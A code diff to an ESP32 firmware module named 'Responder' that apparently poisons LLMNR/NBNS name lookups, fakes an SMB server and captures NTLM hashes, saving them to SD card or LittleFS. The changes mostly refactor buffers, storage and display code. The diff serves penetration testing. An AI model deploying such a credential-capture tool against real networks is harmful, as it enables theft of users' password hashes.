@@ -87,7 +87,7 @@ void encodeNetBIOSName(const char *name, uint8_t out[32]) {
 
 IPAddress getIPAddress() {
     // 1) Station mode
-    if (WiFi.status() == WL_CONNECTED) {
+    if (WiFi.isConnected()) {
         IPAddress ip = WiFi.localIP();
         if (ip && ip != IPAddress(0, 0, 0, 0)) { return ip; }
     }
@@ -105,10 +105,6 @@ uint64_t getWindowsTimestamp() {
     gettimeofday(&tv, NULL);
     return ((tv.tv_sec + EPOCH_DIFF) * 10000000ULL + (tv.tv_usec * 10ULL));
 }
-
-// Buffer pour le NTLM Type 2 généré dynamiquement
-uint8_t ntlmType2Buffer[512];
-uint16_t ntlmType2Len = 0;
 
 void buildNTLMType2Msg(uint8_t *challenge, uint8_t *buffer, uint16_t *len) {
     uint8_t avPairs[512];
@@ -195,7 +191,7 @@ String readUTF16(uint8_t *pkt, uint32_t offset, uint16_t len) {
 
 void updateHashUI() {
     // auto& d = M5Cardputer.Display;
-    // drawMainBorderWithTitle("RESPONDER", true); // clear
+    drawMainBorderWithTitle("RESPONDER", true); // clear
 
     // 1) NTLM count
     tft.setTextSize(FP);
@@ -289,7 +285,14 @@ void extractAndPrintHash(uint8_t *pkt, uint32_t smbLength, uint8_t *ntlm) {
     Serial.println(F("------------------------------------"));
 
     // 8. Save sur SD
-    File file = SD.open("/NTLM/ntlm_hashes.txt", FILE_APPEND);
+    FS *fs;
+    if (setupSdCard()) fs = &SD;
+    else {
+        fs = &LittleFS;
+        if (!checkLittleFsSize()) return;
+    }
+    if (!fs->exists("/BruceResponder")) fs->mkdir("/BruceResponder");
+    File file = fs->open("/BruceResponder/ntlm_hashes.txt", FILE_APPEND);
     if (file) {
         file.println(finalHash);
         file.close();
@@ -373,6 +376,9 @@ void sendSMB1NegotiateResponse(uint8_t *req) {
 }
 
 void sendSMB1Type2(uint8_t *req, uint8_t *ntlm1) {
+    uint8_t ntlmType2Buffer[512];
+    uint16_t ntlmType2Len = 0;
+
     // 1) Génère un challenge aléatoire de 8 octets
     for (int i = 0; i < 8; ++i) { smbState.challenge[i] = (uint8_t)(esp_random() & 0xFF); }
 
@@ -593,30 +599,26 @@ void responder() {
     smbState.active = false;
 
     Serial.println(F("Responder ready - Waiting for NBNS/LLMNR request..."));
-
+    unsigned long lastAnim = 0;
+    drawMainBorderWithTitle("RESPONDER", true);
     while (!check(EscPress)) {
         // M5Cardputer.update();
-        // unsigned long now = millis();
-        // if (now - lastAnim > 250) {
-        //  Choix de la fonction selon le count
-        if (hashCount == 0) {
-            // showWaitingAnimation();
-            tft.setCursor(10, BORDER_PAD_Y + FM * LH);
-            tft.setTextSize(FP);
-            tft.println("Waiting LLMNR Interact");
-        } else if (hashCount == 1) {
-            drawMainBorderWithTitle("RESPONDER", true);
-            tft.setCursor(10, BORDER_PAD_Y + FM * LH);
-            tft.setTextSize(FP);
-            tft.println("Found Interaction!\nthanks 7h30th3r0n3");
-        } else {
-            drawMainBorderWithTitle("RESPONDER", true);
-            tft.setCursor(10, BORDER_PAD_Y + FM * LH);
-            tft.setTextSize(FP);
-            tft.println("End");
+        unsigned long now = millis();
+        if (now - lastAnim > 250) {
+            //  Choix de la fonction selon le count
+            if (hashCount == 0) {
+                tft.setCursor(10, BORDER_PAD_Y + FM * LH);
+                tft.setTextSize(FP);
+                tft.println("Waiting LLMNR Interact");
+            } else if (hashCount == 1) {
+                tft.setCursor(10, tftHeight - (7 + 2 * FP * LH));
+                tft.setTextSize(FP);
+                tft.println("Found Interaction!");
+                tft.setCursor(10, tftHeight - (6 + FP * LH));
+                tft.println("thanks 7h30th3r0n3");
+            }
+            lastAnim = now;
         }
-        // lastAnim = now;
-        //}
 
         int packetSize = nbnsUDP.parsePacket();
         if (packetSize > 0) {
@@ -938,6 +940,9 @@ void responder() {
                                                     "NTLMSSP Type 1 received, sending Type 2 (challenge)..."
                                                 ));
 
+                                                uint8_t ntlmType2Buffer[512];
+                                                uint16_t ntlmType2Len = 0;
+
                                                 // 1) Génère un challenge aléatoire de 8 octets
                                                 for (int i = 0; i < 8; ++i) {
                                                     smbState.challenge[i] = (uint8_t)(esp_random() & 0xFF);
@@ -1073,6 +1078,7 @@ void responder() {
             smbState.active = false;
             Serial.println(F("Client SMB disconnected."));
         }
+        vTaskDelay(pdMS_TO_TICKS(1));
     }
 
     // waitAndReturnToMenu("Return to menu");
